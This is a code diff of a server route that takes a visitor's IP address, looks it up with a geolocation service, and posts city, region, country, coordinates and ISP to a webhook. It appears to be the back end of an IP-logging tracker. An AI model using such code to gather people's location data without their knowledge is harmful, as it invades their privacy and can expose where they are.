@@ -1,12 +1,23 @@
 export async function POST(request) {
   try {
     const body = await request.json();
-    const { ip, geolocation, timestamp = new Date().toISOString() } = body;
+    const { ip, timestamp = new Date().toISOString() } = body;
     
     const webhookURL = process.env.spiderwebb;
     
     if (!webhookURL) {
       throw new Error("Webhook URL not configured");
+    }
+    
+    let locationData = null;
+    
+    if (ip) {
+      try {
+        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        locationData = await geoResponse.json();
+      } catch(e) {
+        console.error('Failed to fetch location data');
+      }
     }
     
     const fields = [];
@@ -17,14 +28,15 @@ export async function POST(request) {
       inline: true
     });
     
-    if (geolocation) {
+    if (locationData && !locationData.error) {
       const locationParts = [];
-      if (geolocation.city) locationParts.push(geolocation.city);
-      if (geolocation.region) locationParts.push(geolocation.region);
-      if (geolocation.country) locationParts.push(geolocation.country);
-      if (geolocation.latitude && geolocation.longitude) {
-        locationParts.push(`📍 ${geolocation.latitude}, ${geolocation.longitude}`);
+      if (locationData.city) locationParts.push(locationData.city);
+      if (locationData.region) locationParts.push(locationData.region);
+      if (locationData.country_name) locationParts.push(locationData.country_name);
+      if (locationData.latitude && locationData.longitude) {
+        locationParts.push(`📍 ${locationData.latitude}, ${locationData.longitude}`);
       }
+      
       if (locationParts.length) {
         fields.push({
           name: "📍 Location",
@@ -32,10 +44,18 @@ export async function POST(request) {
           inline: true
         });
       }
+      
+      if (locationData.org) {
+        fields.push({
+          name: "🏢 ISP",
+          value: locationData.org,
+          inline: true
+        });
+      }
     }
     
     const embed = {
-      title: "📍 User Location Data",
+      title: "🌐 IP Detection",
       color: 0x5865f2,
       fields: fields,
       footer: {
